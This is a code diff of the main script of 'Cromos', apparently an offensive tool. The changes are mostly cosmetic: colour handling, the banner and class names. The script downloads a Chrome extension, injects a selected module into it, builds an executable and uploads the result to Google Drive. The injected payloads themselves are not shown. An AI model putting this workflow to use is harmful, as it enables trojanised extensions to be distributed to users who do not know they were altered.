@@ -1,32 +1,27 @@
 #!/usr/bin/python
 
 import argparse
-from pyfiglet import Figlet
 import sys
 import libs.crx
-from libs.crx import CRX
+from libs.crx import Cromos
 from libs.drive import Drive
 from libs.build import Build
 from libs.loader import Loader
 
-from termcolor import colored, cprint
+class Color:
 
+    header = '\033[95m'
+    blue = '\033[94m'
+    green = '\033[92m'
+    warning = '\033[93m'
+    fail = '\033[91m'
+    endc = '\033[0m'
+    bold = '\033[1m'
+    underline = '\033[4m'
 
-class backgroundColor:
+def Banner() : 
 
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
-def Flag() : 
-
-	banner = """
-
+	Banner = """
          (         )      *         )    (     
    (     )\ )   ( /(    (  `     ( /(    )\ )  
    )\   (()/(   )\())   )\))(    )\())  (()/(  
@@ -34,12 +29,12 @@ def Flag() :
  )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
 ((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
  | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
-  \___| |_|_\   \___/  |_|  |_|  \___/  |___/\n
-\033[1mVersion:\033[0m 1.0 \033[1mBuilds:\033[0m 3 \033[1mModules:\033[0m 2
+  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
  """
-	print("{}".format(backgroundColor.WARNING + banner + backgroundColor.ENDC))
+	print("{}".format(Color.warning + Banner + Color.endc))
+	print("  Version: {} Builds: {} Modules: {}\n".format("1.0","3", "2"))
 
-def optionsParser () :
+def Help () :
 
 	global extension, build, apikey, module
 
@@ -62,29 +57,26 @@ def optionsParser () :
 
 if __name__== "__main__" :
 
-	Flag()
-	optionsParser()
+	Banner()
+	Help()
 
-	application = CRX(extension)
+	cromos = Cromos(extension)
 	
-	if application.valid():
+	if cromos.valid():
 
-		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Download the CRX {} ...".format(extension))
-		application.download()
+		print(Color.green + "[+]" + Color.endc + " Download the CRX {} ...".format(extension))
+		cromos.download()
+		cromos.unpack()
 
-		# print("[+] Unpacking the CRX {} ...".format(extension))
-		application.unpack()
-
-		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Loading the module {}".format(module))
+		print(Color.green + "[+]" + Color.endc + " Loading the module {}".format(module))
 		loader = Loader(module).inject()
 
-		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Creating executable file in output/builds/{}.bat ...".format(extension))
-		build = Build(extension).Builder()
-		
-		# print("[+] Extract the zip file {} ...".format(extension))
-		application.extract()
-		print(backgroundColor.WARNING + "[!]" + backgroundColor.ENDC +  " Extension directory output/extension/{}".format(extension))
+		print(Color.green + "[+]" + Color.endc + " Creating executable file in output/builds/{}.{} ...".format(extension, build))
+		build = Build(extension, build).Builder()
 
-		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Upload files in the Google Drive ...")
+		cromos.extract()
+		print(Color.warning + "[!]" + Color.endc +  " Extension directory output/extension/{}".format(extension))
+
+		print(Color.green + "[+]" + Color.endc + " Upload files in the Google Drive ...")
 		drive = Drive(extension, apikey)
-		print(backgroundColor.OKGREEN + "[+]" + backgroundColor.ENDC + " Well, it's okay! ") 
+		print(Color.green + "[+]" + Color.endc + " Well, it's okay! ") 
